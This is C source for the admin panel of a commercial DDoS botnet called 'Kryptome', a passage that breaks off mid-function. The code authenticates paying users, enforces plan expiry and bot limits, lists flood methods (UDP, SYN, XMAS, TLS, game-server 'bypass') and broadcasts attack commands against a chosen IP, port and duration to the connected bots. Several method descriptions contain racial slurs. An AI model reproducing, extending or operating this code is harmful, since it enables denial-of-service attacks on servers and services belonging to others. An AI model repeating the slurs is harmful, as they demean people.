#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "includes.h"
#include "user.h"
#include "bots.h"
#include "usercmds.h"
#include "util.h"
#include "resolver.h"

static struct telnetdata_t *managements = {NULL};

static struct attack_vector_t **vectors = {NULL};
static int vectors_len = 0;

char *userprompt = "\x1b[1;91m%s\x1b[1;91m@\x1b[1;91mKRYPTOME\x1b[1;91m: \x1b[1;91m";

int get_bot_count(int max)
{
	struct clientdata_t *clients = bots_get_clients();
	int i, max_count = 0;
	for (i = 0; i < MAXFDS; i++)
	{
		if (!clients[i].connected) continue;
		max_count++;
		if(max != -1 && max_count >= max)
		{
			return max_count;
		}
	}
	return max_count;
}

struct telnetdata_t *admin_retrieve_user_fd(int fd)
{
	return &managements[fd];
}

struct telnetdata_t *admin_retrieve_users()
{
	return managements;
}

void admin_send_prompt(int fd)
{
	char tmp_prompt[256];
	sprintf(tmp_prompt, userprompt, managements[fd].username);
	send(fd, tmp_prompt, strlen(tmp_prompt), MSG_NOSIGNAL);
	return;
}

int admin_check_attack_ip(char *host)
{
	int ret = 0;
	FILE *fp = fopen("blacklist.txt", "r");
	if(!fp)
	{
		fp = fopen("blacklist.txt", "w");
		if(!fp)
		{
			return ret;
		}
		fprintf(fp, "127.0.0.1\r\n");
		fprintf(fp, "10.0.0\r\n");
		fprintf(fp, "192.168\r\n");
		fflush(fp);
		fclose(fp);
		fp = fopen("blacklist.txt", "r");
		if(!fp)
		{
			return ret;
		}
	}

	trim(host);
	unsigned char **host_argv = NULL;
	int host_argc = 0;
	if(util_strexists(host, ".") == 1) {
		if((host_argv = util_strip(host, &host_argc, '.')) != NULL)
		{
			if(host_argc != 4)
			{
				#ifdef DEBUG
				printf("Host is not a complete ip address\r\n");
				#endif
				return ret;
			}
		}
	}
	else
	{
		#ifdef DEBUG
		printf("Host is not a complete ip address\r\n");
		#endif
		return ret;
	}

	char *buffer = malloc(1024);
	memset(buffer, 0, 1024);

	while(fgets(buffer, 1024, fp) != NULL)
	{
		trim(buffer);
		unsigned char **argv = NULL;
		int argc = 0;
		if(util_strexists(buffer, ".") == 1) {
			if((argv = util_strip(buffer, &argc, '.')) != NULL)
			{
				int x, match = 0;
				for(x = 0; x < argc; x++)
				{
					if(!strcmp(argv[x], host_argv[x]))
					{
						#ifdef DEBUG
						printf("buffer = %s & host = %s, %s=%s\r\n", buffer, host, argv[x], host_argv[x]);
						#endif
						match = 1;
						continue;
					}
					else
					{
						#ifdef DEBUG
						printf("buffer = %s & host = %s, %s!=%s\r\n", buffer, host, argv[x], host_argv[x]);
						#endif
						match = 0;
						break;
					}
				}

				for(x = 0; x < argc; x++)
				{
					free(argv[x]);
				}
				free(argv);

				if(match == 1)
				{
					#ifdef DEBUG
					printf("(buffer = %s) = (host = %s)\r\n", buffer, host);
					#endif
					ret = 1;
					break;
				}
			}
		}
		else
		{
			if(!strcmp(host_argv[0], buffer))
			{
				#ifdef DEBUG
				printf("buffer = %s & host = %s, %s=%s\r\n", buffer, host, buffer, host_argv[0]);
				#endif
				ret = 1;
				break;
			}
			else
			{
				#ifdef DEBUG
				printf("buffer = %s & host = %s, %s!=%s\r\n", buffer, host, buffer, host_argv[0]);
				#endif
			}
		}

	}

	int x;
	for(x = 0; x < host_argc; x++)
	{
		free(host_argv[x]);
	}
	free(host_argv);

	#ifdef DEBUG
	printf("ret = %d\r\n", ret);
	#endif

	return ret;
}

int admin_get_motd_lines()
{
	int ret = -1;
	FILE *fp = fopen("motd.txt", "r");
	if(!fp)
	{
		fp = fopen("motd.txt", "w");
		if(!fp)
		{
			printf("[ERROR] failed to open motd.txt for writing\r\n");
			return ret;
		}
		fprintf(fp, "No MOTD set!\r\n");
		fflush(fp);
		fclose(fp);
		fp = fopen("motd.txt", "r");
		if(!fp)
		{
			printf("[ERROR] failed to open motd.txt for reading\r\n");
			return ret;
		}
	}

	ret = 0;// no there are no io errors
	// lets start counter

	char *buffer = malloc(1024);
	memset(buffer, 0, 1024);
	while(fgets(buffer, 1024, fp) != NULL)
	{
		ret++;
		memset(buffer, 0, 1024);
	}

	free(buffer);

	fclose(fp);

	return ret;
}

int admin_get_motd(char *out, int line_pos)
{
	int ret = -1;// -1 means failed to open file for reading
	FILE *fp = fopen("motd.txt", "r");
	if(!fp)
	{
		fp = fopen("motd.txt", "w");
		if(!fp)
		{
			printf("[ERROR] failed to open motd.txt for reading\r\n");
			return ret;
		}
		fprintf(fp, "No MOTD set!\r\n");
		fflush(fp);
		fclose(fp);
		fp = fopen("motd.txt", "r");
		if(!fp)
		{
			printf("[ERROR] failed to open motd.txt for reading\r\n");
			return ret;
		}
	}

	ret = 0;// 0 means failed to find line

	int current_pos = 0;
	char *buffer = malloc(1024);
	memset(buffer, 0, 1024);
	memset(out, 0, sizeof(out));
	while(fgets(buffer, sizeof(buffer), fp) != NULL)
	{
		if(current_pos == line_pos)
		{
			strncpy(out, buffer, sizeof(out));// prevents buffer overflow
			memset(buffer, 0, 1024);
			ret = 1;
			break;
		}
		current_pos++;
		memset(buffer, 0, 1024);
		continue;
	}

	free(buffer);

	fclose(fp);

	return ret;
}

void admin_print_motd(int fd) 
{
	int motd_count = admin_get_motd_lines();
	if(motd_count == -1)
	{
		//print error
		send(fd, "Error loading motd\r\n", strlen("Error loading motd\r\n"), MSG_NOSIGNAL);
		return;
	} 
	else if(motd_count == 0)
	{
		return;// no motd
	}
	int x;
	for(x = 0; x < motd_count; x++)
	{
		char xxx[1024];
		int ret = admin_get_motd(xxx, x);
		if(ret == -1)
		{
			if(x == 0)
			{
				send(fd, "Error loading motd\r\n", strlen("Error loading motd\r\n"), MSG_NOSIGNAL);
			}
			else
			{                     
				send(fd, "\x1b[1;91m                         Error loading motd\r\n", strlen("\x1b[1;91m                         Error loading motd\r\n"), MSG_NOSIGNAL);
			}
			break;
		}
		else if(ret == 0)
		{
			break;
		}
		else
		{
			if(x == 0)
			{
				char sendbuf[2048];
				sprintf(sendbuf, "%s\r\n", xxx);
				send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
			else
			{
				char sendbuf[2048];
				sprintf(sendbuf, "\x1b[1;91m                         %s\r\n", xxx);
				send(fd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
			continue;
		}
	}
	return;
}

static void add_vector(uint8_t vector, char *name, char *args, char *desc) 
{
	vectors = realloc(vectors, (vectors_len+1)*sizeof(struct attack_vector_t *));
	vectors[vectors_len] = malloc(sizeof(struct attack_vector_t));
	vectors[vectors_len]->vector = vector;
	util_strcpy(vectors[vectors_len]->name, name);
	util_strcpy(vectors[vectors_len]->name+util_strlen(vectors[vectors_len]->name), "\0");
	util_strcpy(vectors[vectors_len]->args, args);
	util_strcpy(vectors[vectors_len]->args+util_strlen(vectors[vectors_len]->args), "\0");
	vectors_len++;
}

static int can_attack(struct telnetdata_t *admin)
{
    int i;
    for(i = 0; i < admin->attks_len; i++)
    {
        if(admin->attks[i]->end_time < time(NULL))
        {
            memset(admin->attks[i], 0, sizeof(struct telnetdata_attk_t));
            free(admin->attks[i]);
            admin->attks[i] = NULL;
            int j;
            for(j = i; j < admin->attks_len-1; j++)
            {
                admin->attks[j] = admin->attks[j+1];
            }
            admin->attks_len -= 1;
        }
    }

    if(atoi(admin->login->max_conns) > admin->attks_len) return 1;
    return 0;
}

void admin_init_vectors(void) {
	add_vector(ATTACK_VECTOR_NFO_V6,      "NFOV6",       "<IP> <PORT> <TIME>",            	  "udp attack optimized for high gbps and server bypass");
	add_vector(ATTACK_VECTOR_GAME_KILLER, "GAME-KILLER", "<IP> <PORT> <TIME> 32 1024 10", 	  "udp attack optimized for game server bypass");
	add_vector(ATTACK_VECOTR_UDP_RAW,     "UDPRAW",      "<IP> <PORT> <TIME>",           	  "a raw udp flood all udp");
	add_vector(ATTACK_VECOTR_RAND_HEX,    "RANDHEX",     "<IP> <PORT> <TIME>",           	  "random hex sting's most thing's get random traffic");
	add_vector(ATTACK_VECOTR_HYDRA_SYN,   "HYDRASYN",    "<IP> <PORT> <TIME>",                "a good method for hitting hydras");
	add_vector(ATTACK_VECOTR_STOMP,       "STOMP",       "<IP> <PORT> <TIME> 32 ALL 1024 10", "a good tcp flood mainley for the port flood");
	add_vector(ATTACK_VECOTR_JUNK,        "JUNK",        "<IP> <PORT> <TIME>", 				  "send's a bunch of junk traffic");
	add_vector(ATTACK_VECOTR_STD,         "STD",         "<IP> <PORT> <TIME>", 				  "basic std flood");
	add_vector(ATTACK_VECOTR_XMAS,        "XMAS",        "<IP> <PORT> <TIME> 32 1024 10", 	  "good tcp flood");
	add_vector(ATTACK_VECTOR_ICMPFLOOD,   "ICMPFLOOD",   "<IP> <PORT> <TIME>",                "jiggaboo dont need this anymore");
	add_vector(ATTACK_VECTOR_OPENVPN,     "OPENVPN",     "<IP> <PORT> <TIME>",                "jiggaboo dont need this anymore");
	add_vector(ATTACK_VECTOR_CHOOPA,      "CHOOPA",      "<IP> <PORT> <TIME>",                "jiggaboo dont need this anymore");
	add_vector(ATTACK_VECTOR_UDPBYPASS,   "UDPBYPASS",   "<IP> <PORT> <TIME> 120",            "jiggaboo dont need this anymore");
	add_vector(ATTACK_VECTOR_TLS,	      "TLS",	     "<IP> <PORT> <TIME>",		  "tls flood nigga");
	managements = malloc(MAXFDS*sizeof(struct telnetdata_t));

	int x;
	for(x = 0; x < MAXFDS; x++)
	{
		managements[x].addr = 0;
		managements[x].authed = 0;
		managements[x].connected = 0;
		managements[x].is_admin = 0;
		managements[x].is_chatroom = 0;
		managements[x].rtlog = 0;
	}
}

static int parse_attack_vector(char *str) {
	int i;
	for(i = 0; i < vectors_len; i++) {
		if(util_strexists(vectors[i]->name, str) == 0) continue;
		return vectors[i]->vector;
	}
	return -1;
}

void *TitleWriter(void *sock)
{
	pthread_detach(pthread_self());
	int datafd = (int) sock;
	char string[999999];
	while (1)
	{
		memset(string, 0, 999999);
		sprintf(string, "%c]0; Welcome %s | Bots: %d %c", '\033', managements[datafd].username, get_bot_count(-1), '\007');
		if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) pthread_exit(0);
		sleep(2);
	}
}

void *admin_timeout_thread(void *vfd)
{
	pthread_detach(pthread_self());
	int fd = (int)vfd;
	sleep(60);
	if(managements[fd].authed == 0)
	{
		pthread_cancel(managements[fd].main_thr);
		close(fd);
		uint32_t addr = managements[fd].addr;
		printf("[LOG] %d.%d.%d.%d failed to authenticate in 60s\r\n", addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);
	}
	pthread_exit(NULL);
}

static struct login_info **auth_get_accounts(int *count) {
	FILE *fp = fopen(ADMIN_LOGIN_FILE, "r");
	if(!fp) {
		return NULL;
	}
	char *buffer = malloc(1024);
	util_zero(buffer);
	struct login_info **ret = {NULL};
	int ret_len = 0;
	while(fgets(buffer, 1024, fp) != NULL)
	{
		trim(buffer);
		unsigned char **argv = NULL;
		int argc = 0;
		if(util_strexists(buffer, ":") == 1) {
			if((argv = util_strip(buffer, &argc, ':')) != NULL)
			{
				if(argc == 6)
				{
					ret = realloc(ret, (ret_len+1)*sizeof(struct login_info *));
					ret[ret_len] = malloc(sizeof(struct login_info));

					int tmp = util_strlen(argv[0]);
					if(tmp > 20) {
						tmp = 20;
					}
					util_zero(ret[ret_len]->username);
					util_memcpy(ret[ret_len]->username, argv[0], tmp);

					tmp = util_strlen(argv[1]);
					if(tmp > 20) {
						tmp = 20;
					}
					util_zero(ret[ret_len]->password);
					util_memcpy(ret[ret_len]->password, argv[1], tmp);

					tmp = util_strlen(argv[2]);
					if(tmp > 20) {
						tmp = 20;
					}
					util_zero(ret[ret_len]->level);
					util_memcpy(ret[ret_len]->level, argv[2], tmp);

					tmp = util_strlen(argv[3]);
					if(tmp > 64) {
						tmp = 64;
					}
					util_zero(ret[ret_len]->expiry);
					util_memcpy(ret[ret_len]->expiry, argv[3], tmp);

                    tmp = util_strlen(argv[4]);
					if(tmp > 20) {
						tmp = 20;
					}
					util_zero(ret[ret_len]->max_bots);
					util_memcpy(ret[ret_len]->max_bots, argv[4], tmp);

                    tmp = util_strlen(argv[5]);
					if(tmp > 20) {
						tmp = 20;
					}
					util_zero(ret[ret_len]->max_conns);
					util_memcpy(ret[ret_len]->max_conns, argv[5], tmp);
                    
					ret_len++;
				}
			}
		}
	}

	*count = ret_len;
	return ret;
}

void admin_log_cmd(char *buffer, int senderFD) {
	char xxx[2048];
	int x;
	for(x = 0; x < MAXFDS; x++)
	{
		if(managements[x].connected != 1) continue;
		if(managements[x].rtlog != 1) continue;
		if(x == senderFD) continue;
		sprintf(xxx, "\r\n[%ds]-[%s]: \"%s\"\r\n", time(NULL), managements[senderFD].username, buffer);
		send(x, xxx, strlen(xxx), MSG_NOSIGNAL);
		memset(xxx, 0, 2048);
		admin_send_prompt(x);
	}
	FILE *logFile = fopen("commands.log", "a");
	if(!logFile)
	{
		logFile = fopen("commands.log", "w");
		if(!logFile)
		{
			return;
		}
	}
	fprintf(logFile, "[%ds]-[%s]: \"%s\"\r\n", time(NULL), managements[senderFD].username, buffer);
	fflush(logFile);
	fclose(logFile);
}

void *BotWorker(void *sock)
{
	pthread_detach(pthread_self());
	int datafd = (int) sock;
	add_operator();
	char buf[2048];
	char username[64];
	char password[64];
	memset(buf, 0, sizeof buf);
	char xxx[2048];
	memset(xxx, 0, 2048);
	char botcount[2048];
	memset(botcount, 0, 2048);
	char statuscount[2048];
	memset(statuscount, 0, 2048);

	pthread_t timeout_thr;//not in management struct bc its so short lived

	pthread_create(&timeout_thr, NULL, &admin_timeout_thread, sock);

	char clearscreen[2048];
	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[1A");
	
	sprintf(xxx, "\x1b[1;91mUsername:\x1b[30m ");
	if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
	memset(xxx, 0, 2048);
	if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
	trim(buf);
	sprintf(username, buf);
	memset(buf, 0, 2048);

	if (send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	sprintf(xxx, "\x1b[1;91mPassword:\x1b[30m ");
	if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
	memset(xxx, 0, 2048);
	if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
	trim(buf);
	sprintf(password, buf);
	memset(buf, 0, 2048);
	
	sprintf(xxx, "\x1b[97mLoading Kryptome Services... (0/3)\r\n");
	if (send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
	memset(xxx, 0, 2048);

	int all_accounts_len = 0;
	struct login_info **all_accounts = auth_get_accounts(&all_accounts_len);
	struct login_info login;

	#ifdef DEBUG
	printf("got accounts number %d\r\n", all_accounts_len);
	#endif

	if(all_accounts_len == 0) goto end;

	uint8_t logged_in = 0;
	int x;
	for(x = 0; x < all_accounts_len; x++)
	{
		#ifdef DEBUG
		printf("got account (%s:%s) need (%s:%s)\r\n", all_accounts[x]->username, all_accounts[x]->password, username, password);
		#endif
		if(util_strexists(username, all_accounts[x]->username) == 1) {
			if(util_strexists(password, all_accounts[x]->password) == 1) {
				logged_in = 1;
				strcpy(login.level, all_accounts[x]->level);
				strcpy(login.username, all_accounts[x]->username);
				strcpy(login.password, all_accounts[x]->password);
				strcpy(login.expiry, all_accounts[x]->expiry);
                strcpy(login.max_bots, all_accounts[x]->max_bots);
                strcpy(login.max_conns, all_accounts[x]->max_conns);
			}
		}
		free(all_accounts[x]);
	}
	free(all_accounts);

    if(logged_in == 0)
	{
		if (send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto end;
	}

	if(atoi(login.expiry) > 0)
	{
		if(atoi(login.expiry) < time(NULL))
		{
			sprintf(xxx, "\x1b[97mYour plan has expired\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
			sleep(5);
			goto end;
		}
	}
	
	managements[datafd].login = &login;
    managements[datafd].attks = NULL;
    managements[datafd].attks_len = 0;

	managements[datafd].authed = 1;
	uint32_t addr = managements[datafd].addr;
	printf("[LOG] User %s has authenticated [%d.%d.%d.%d]\r\n", username, addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

	sleep(1);
	
	sprintf(xxx, "\x1b[97mInitializing account data (1/3)\r\n");
	if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
	memset(xxx, 0, 2048);
	
	managements[datafd].is_chatroom = 0;
	managements[datafd].rtlog = 0;
	managements[datafd].is_admin = 0;
	strcpy(managements[datafd].username, username);
	
	if(!strcmp(login.level, "admin"))
	{
		managements[datafd].is_admin = 1;
		sprintf(xxx, "\x1b[97mFound admin level account (you)\r\n");
		if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
		memset(xxx, 0, 2048);
	}
	
	sleep(1);
	
	sprintf(xxx, "\x1b[97mInitializing title writer (2/3)\r\n");
	if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
	memset(xxx, 0, 2048);
	
	sleep(1);
	pthread_create(&managements[datafd].titlewriter_thr, NULL, &TitleWriter, sock);
	managements[datafd].connected = 1;
	
	sprintf(xxx, "\x1b[97mKryptome Prelaunch Initialization finished. (3/3)\r\n");
	if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
	memset(xxx, 0, 2048);
	
	char instagram_Korpze1[512];
	char instagram_Korpze2[512];
	char instagram_Korpze3[512];
	char instagram_Korpze4[512];
	char instagram_Korpze5[512];
	char instagram_Korpze6[512];
	char instagram_Korpze7[512];
	char instagram_Korpze8[512];
	char instagram_Korpze9[512];
	char instagram_Korpze10[512];
	char instagram_Korpze11[512];
	char instagram_Korpze12[512];
	char instagram_Korpze13[512];
	sprintf(instagram_Korpze1, "\x1b[1;96m                             ╦╔═╦═╗╦ ╦╔═╗╔╦╗╔═╗╔╦╗╔═╗\r\n");
	sprintf(instagram_Korpze2, "\x1b[1;96m                             ╠╩╗╠╦╝╚╦╝╠═╝ ║ ║ ║║║║║╣ \r\n");
	sprintf(instagram_Korpze3, "\x1b[1;96m                             ╩ ╩╩╚═ ╩ ╩   ╩ ╚═╝╩ ╩╚═╝\r\n");
	sprintf(instagram_Korpze4, "\x1b[1;91m                               𝓚𝓡𝓨𝓟𝓣𝓞𝓜𝓔 • 𝓑𝓞𝓣𝓝𝓔𝓣\r\n");
	sprintf(instagram_Korpze5, "\x1b[1;96m                        ══╦══════════════════════════╦══\r\n");
	sprintf(instagram_Korpze6, "\x1b[1;96m              ╔═══════════╩══════════════════════════╩═══════════╗\r\n");
	sprintf(instagram_Korpze7, "\x1b[1;96m              ║\x1b[1;91m                 Welcome To Kryptome          \x1b[1;96m    ║\r\n");
	sprintf(instagram_Korpze8, "\x1b[1;96m              ║\x1b[1;91m     Kryptome Owner Is @Korpze1 On Instagram   \x1b[1;96m   ║\r\n");
	sprintf(instagram_Korpze9, "\x1b[1;96m              ╚╦════════════════════════════════════════════════╦╝\r\n");
	sprintf(instagram_Korpze10, "\x1b[1;96m              ╔╩════════════════════════════════════════════════╩╗\r\n");
	sprintf(instagram_Korpze11, "\x1b[1;96m              ║\x1b[1;91m   Type [help] To See All Of Kryptome's Features \x1b[1;96m ║\r\n");
	sprintf(instagram_Korpze12, "\x1b[1;96m              ║\x1b[1;91m   Copyright © 2021 Kryptome All Right's Reserved\x1b[1;96m ║\r\n");
	sprintf(instagram_Korpze13, "\x1b[1;96m              ╚══════════════════════════════════════════════════╝\r\n");

	if (send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze1, strlen(instagram_Korpze1), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze2, strlen(instagram_Korpze2), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze3, strlen(instagram_Korpze3), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze4, strlen(instagram_Korpze4), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze5, strlen(instagram_Korpze5), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze6, strlen(instagram_Korpze6), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze7, strlen(instagram_Korpze7), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze8, strlen(instagram_Korpze8), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze9, strlen(instagram_Korpze9), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze10, strlen(instagram_Korpze10), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze11, strlen(instagram_Korpze11), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze12, strlen(instagram_Korpze12), MSG_NOSIGNAL) == -1) goto end;
	if (send(datafd, instagram_Korpze13, strlen(instagram_Korpze13), MSG_NOSIGNAL) == -1) goto end;
	admin_print_motd(datafd);
	admin_send_prompt(datafd);

	while (fdgets(buf, sizeof(buf), datafd) > 0)
	{
		buf[strcspn(buf, "\r\n")] = 0;
		trim(buf);

        if(util_strlen(buf) < 1) {
			admin_send_prompt(datafd);
			continue;
		}

		unsigned char **args = {NULL};
		int args_len = 0;
		if(util_strexists(buf, " ") == 1) {
			args = util_strip(buf, &args_len, ' ');
		} else {
			args = calloc(1, sizeof(unsigned char *));
			args[0] = calloc(util_strlen(buf)+1, sizeof(unsigned char));
			args_len = 1;
			util_strcpy(args[0], buf);
		}

        if(!strcmp(args[0], "!*"))
        {
			if(args_len > 1) {
				if(parse_attack_vector(args[1]) != -1) 
				{
					if(args_len > 4) 
					{
						unsigned char *ip = args[2];
						int port = atoi(args[3]);
						int attktime = atoi(args[4]);
						
						if(admin_check_attack_ip(ip) == 1)
						{
							sprintf(xxx, " \x1b[1;96mAttempt to attack a blacklisted host\r\n");
							if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
							memset(xxx, 0, 2048);
						}
						else
						{
							if(port > 65535 || port < 1)
							{
								sprintf(xxx, " \x1b[1;96mInvalid port please use a number 1-65535\r\n");
								if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
								memset(xxx, 0, 2048);
							} 
							else 
							{
								if(attktime > 90 || attktime < 1)
								{
									sprintf(xxx, " \x1b[1;96mInvalid time please use number 1-90\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
								else
								{
                                    if(can_attack(&managements[datafd]) == 0)
                                    {
                                        sprintf(xxx, " \x1b[1;96mMax attacks running! (MAX %d)\r\n", atoi(managements[datafd].login->max_conns));
									    if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									    memset(xxx, 0, 2048);
                                    }
                                    else
                                    {
                                        managements[datafd].attks = realloc(managements[datafd].attks, (managements[datafd].attks_len+1)*sizeof(struct telnetdata_attk_t *));
                                        managements[datafd].attks[managements[datafd].attks_len] = malloc(sizeof(struct telnetdata_attk_t));
                                        managements[datafd].attks[managements[datafd].attks_len]->running = 1;
                                        managements[datafd].attks[managements[datafd].attks_len]->end_time = time(NULL)+time;
                                        managements[datafd].attks_len += 1;
									    sprintf(xxx, " \x1b[1;96mAttack sent to %d bots with method %s on host %s:%d for %ds\r\n", get_bot_count(atoi(managements[datafd].login->max_bots)), args[1], ip, port, attktime);
									    if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									    memset(xxx, 0, 2048);
									    broadcast(buf, atoi(login.max_bots));
                                    }
								}
							}
						}
					}
					else 
					{
						sprintf(xxx, " \x1b[1;96mPlease type methods for attack format!\r\n");
						if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
						memset(xxx, 0, 2048);
					}
				}
				else 
				{
					sprintf(xxx, " \x1b[1;96mInvalid attack vector. Please type methods for attack format!\r\n");
					if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
					memset(xxx, 0, 2048);
				}
			}
			else
			{
				sprintf(xxx, " \x1b[1;96mPlease type methods for attack format!\r\n");
				if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
				memset(xxx, 0, 2048);
			}
        }
		
		if(!strcmp(args[0], "?") || !strcmp(args[0], "help") || !strcmp(args[0], "HELP") || !strcmp(args[0], "methods") || !strcmp(args[0], "METHODS"))
		{
			sprintf(xxx, " \x1b[1;91m----==={ Kryptome DDoS Attack Methods }===----\r\n");
			if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
			memset(xxx, 0, 2048);
			int x;
			for(x = 0; x < vectors_len; x++)
			{
				sprintf(xxx, "   \x1b[1;96m!* %s %s\r\n", vectors[x]->name, vectors[x]->args);
				if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
				memset(xxx, 0, 2048);
			}
		}

		if(!strcmp(args[0], "chat") || !strcmp(args[0], "CHAT"))
		{
			if(usercmds_chat(datafd) > 0)
			{
				if (send(datafd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze1, strlen(instagram_Korpze1), MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze2, strlen(instagram_Korpze2), MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze3, strlen(instagram_Korpze3), MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze4, strlen(instagram_Korpze4), MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze5, strlen(instagram_Korpze5), MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze6, strlen(instagram_Korpze6), MSG_NOSIGNAL) == -1) goto end;
				if (send(datafd, instagram_Korpze7, strlen(instagram_Korpze7), MSG_NOSIGNAL) == -1) goto end;
				admin_print_motd(datafd);
			}
			else
			{
				goto end;
			}
		}
		
		if(!strcmp(args[0], "ADMIN") || !strcmp(args[0], "admin"))
		{
			if(managements[datafd].is_admin == 1)
			{
				if(args_len > 1) 
				{
					if(!strcmp(args[1], "users"))
					{
						if(args_len > 2)
						{
							if(!strcmp(args[2], "add"))
							{
								if(args_len > 8)
								{
									char *username = args[3];
									char *password = args[4];
									char *level = args[5];
									int expiry_days = atoi(args[6]);
                                    int max_bots = atoi(args[7]);
                                    int max_conns = atoi(args[8]);
									uint8_t open = 0;
									FILE *fp = fopen(ADMIN_LOGIN_FILE, "a");
									if(!fp)
									{
										fp = fopen(ADMIN_LOGIN_FILE, "w");
										if(!fp) 
										{
											open = 0;
										}
										else
										{
											open = 1;
										}
									}
									else
									{
										open = 1;
									}
									
									if(open == 1)
									{
										int expiry_hours = expiry_days*24;// 24 hours = 1 day
										int expiry_minutes = expiry_hours*60;// 60 minutes = 1 hour
										int expiry_seconds = expiry_minutes*60;// 60 seconds = 1 minute
										int expiry = time(NULL)+expiry_seconds;
										fprintf(fp, "%s:%s:%s:%d:%d:%d\r\n", username, password, level, expiry, max_bots, max_conns);
										fflush(fp);
										fclose(fp);
										sprintf(xxx, " \x1b[1;96mAdded user %s with password %s and level %s! Expires at %ds\r\n", username, password, level, expiry);
										if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
									}
									else
									{
										sprintf(xxx, " \x1b[1;96mFailed to add user! Contact admin, (no file access?)\r\n");
										if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
										memset(xxx, 0, 2048);
									}
								}
								else
								{
									sprintf(xxx, " \x1b[1;96mUsage: admin users add <name> <pass> <admin/user> <time in days/-1> <max bots> <max conns>\r\n");
									if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
									memset(xxx, 0, 2048);
								}
							}
							else if(!strcmp(args[2], "del"))
							{
								if(args_len > 3)
								{
									char *username = args[3];
									uint8_t open = 0;
									FILE *fp = fopen(ADMIN_LOGIN_FILE, "r");
									FILE *tmpfp = fopen(ADMIN_LOGIN_FILE ".tmp", "w");
									if(!fp || !tmpfp)
									{
										fclose(fp);
										fclose(tmpfp);
										open = 0;
									}
									else
									{
										open = 1;
									}
									
									if(open == 1)
									{
										uint8_t found = 0;
										char *file_buffer = malloc(1024);
										memset(file_buffer, 0, 1024);
										while(fgets(file_buffer, 1024, fp) != NULL)
										{
											if(strstr(file_buffer, username) == NULL)
											{
												fprintf(tmpfp, "%s", file_buffer);
											}
											else
											{
												found = 1;
											}
											memset(file_buffer, 0, 1024);
										}
										
										free(file_buffer);
										
										fclose(fp);
										fclose(tmpfp);
										
										if(found == 1) 
										{
											unlink(ADMIN_LOGIN_FILE);
											rename(ADMIN_LOGIN_FILE ".tmp", ADMIN_LOGIN_FILE);
											sprintf(xxx, " \x1b[1;96mDeleted user %s!\r\n", username);
											if (send(datafd, xxx, strlen(xxx), MSG_NOSIGNAL) == -1) goto end;
											memset(xxx, 0, 2048);
										}
										else
										{
											unlink(ADMIN_LOGIN_FILE ".tmp");
											sprintf(xxx, " \x1b[1;96mUser %s not exists!\r\n", username);
